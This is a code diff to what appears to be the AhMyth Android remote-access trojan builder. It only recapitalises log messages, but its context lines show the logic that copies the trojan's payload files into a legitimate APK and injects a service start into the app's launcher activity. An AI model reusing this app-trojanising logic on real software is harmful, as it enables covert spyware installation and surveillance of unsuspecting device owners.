@@ -167,7 +167,7 @@ New function for copying AhMyth files to the original app
     // and if success go to generate the apk
     $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-        $appCtrl.Log("Copying Ahmyth files to orginal app...");
+        $appCtrl.Log("Copying AhMyth Files to Orginal APK...");
         $appCtrl.Log();
         fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, launcherPath), (error) => {
             if (error) {
@@ -185,7 +185,7 @@ Existing functons updated for the newly created "Launcher Location function" con
 ```javascript
             var launcherActivity = GetLauncherActivity(data, apkFolder);
             if (launcherActivity == -1) {
-                $appCtrl.Log("Cannot find the launcher activity in the Manifest!", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
                 $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
                 $appCtrl.Log();
                 return;
@@ -209,7 +209,7 @@ Existing functons updated for the newly created "Launcher Location function" con
                   var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                   if (error !== null) {
                       $appCtrl.Log("Cannot Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                      $appCtrl.Log('Please use the "On Boot" method', CONSTANTS.logStatus.INFO);
+                      $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
                       $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                       $appCtrl.Log();
                       return;
@@ -222,7 +222,7 @@ Existing functons updated for the newly created "Launcher Location function" con
                     fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                         if (error) {
                             $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
-                            $appCtrl.Log('Please use the "On Boot" method', CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
                             $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                             $appCtrl.Log();
                             return;
@@ -236,12 +236,12 @@ Existing functons updated for the newly created "Launcher Location function" con
 
 
                         var key = CONSTANTS.orgAppKey;
-                        $appCtrl.Log("Modifiying launcher activity...");
+                        $appCtrl.Log("Modifiying Launcher Activity...");
                         $appCtrl.Log();
                         var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                         fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                             if (error) {
-                                $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
+                                $appCtrl.Log('Modifying Launcher Activity Failed', logStatus.FAIL);
                                 $appCtrl.Log();
                                 return;
                             }
